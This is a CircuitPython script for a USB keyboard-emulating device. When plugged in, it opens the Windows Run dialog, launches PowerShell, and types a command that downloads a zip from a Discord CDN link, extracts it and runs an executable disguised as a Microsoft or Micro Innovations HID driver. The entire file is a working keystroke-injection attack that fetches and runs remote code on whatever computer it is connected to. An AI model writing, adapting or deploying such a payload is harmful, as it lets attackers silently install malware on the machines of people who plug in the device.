import time
import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keycode import Keycode
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS

kbd = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(kbd)

def run_powershell_command(command):
    # Open Run dialog
    kbd.press(Keycode.WINDOWS, Keycode.R)
    kbd.release_all()
    time.sleep(0.5)

    # Launch PowerShell
    layout.write("powershell")
    kbd.press(Keycode.ENTER)
    kbd.release_all()
    time.sleep(1.5)

    # type and run the PowerShell command
    layout.write(command)
    kbd.press(Keycode.ENTER)
    kbd.release_all()

# Wait for USB to be ready
time.sleep(3)

# PowerShell to download, unzip, and run the EXE
powershell_command = (
    '$url = "https://cdn.discordapp.com/attachments/1366011992808358069/1367706602093805589/Microsoft_HID-Class_Device_Driver_5.1.2600.2180.zip?ex=681b7e48&is=681a2cc8&hm=cb1847b9156b9466438a66a8dccfeed26988d637df08817e4f145e8ec6313291&"; '
    '$zip = "$env:USERPROFILE\\Downloads\\driver.zip"; '
    '$out = "$env:USERPROFILE\\Downloads\\unzipped"; '
    'Invoke-WebRequest -Uri $url -OutFile $zip; '
    'Expand-Archive -Path $zip -DestinationPath $out -Force; '
    'Start-Process "$out\\Micro Innovations USB Input Device Driver v3.42.118 - MIUInput.sys\\MIUInstaller.exe"'
)

run_powershell_command(powershell_command)
